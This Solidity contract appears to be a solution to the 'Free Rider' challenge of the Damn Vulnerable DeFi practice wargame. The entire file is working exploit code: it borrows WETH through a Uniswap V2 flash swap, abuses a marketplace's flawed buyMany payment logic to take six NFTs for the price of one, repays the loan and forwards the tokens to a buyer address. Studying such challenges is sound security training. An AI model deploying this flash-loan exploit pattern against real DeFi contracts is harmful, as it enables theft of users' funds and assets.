// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";

/**
@title Free Rider Attacker
@author kootsZhin
 */

contract FreeRiderAttacker is ReentrancyGuard, IERC721Receiver {
    IUniswapV2Pair pair;
    IUniswapV2Factory factoryV2;
    FreeRiderNFTMarketplace NFTMarket;
    DamnValuableNFT NFT;
    address buyer;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _pair,
        address _factoryV2,
        address _NFTMarket,
        address _NFT,
        address _buyer
    ) {
        pair = IUniswapV2Pair(_pair);
        factoryV2 = IUniswapV2Factory(_factoryV2);
        NFTMarket = FreeRiderNFTMarketplace(payable(_NFTMarket));
        NFT = DamnValuableNFT(_NFT);
        buyer = _buyer;
    }

    function attack(uint256 amount0Out) external {
        pair.swap(amount0Out, 0, address(this), "1");
        for (uint256 i = 0; i < 6; i++) {
            NFT.safeTransferFrom(NFT.ownerOf(i), buyer, i);
        }
    }

    // SEE: https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == factoryV2.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        // rest of the function goes here!
        WETH9(payable(token0)).withdraw(amount0);
        NFTMarket.buyMany{value: address(this).balance}(tokenIds);
        WETH9(payable(token0)).deposit{value: (amount0 * 10031) / 10000}();
        WETH9(payable(token0)).transfer(
            address(pair),
            WETH9(payable(token0)).balanceOf(address(this))
        );
    }

    // SEE: https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    receive() external payable {}

    // SEE: https://ethereum.stackexchange.com/questions/48796/whats-the-point-of-erc721receiver-sol-and-erc721holder-sol-in-openzeppelins-im/102940
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
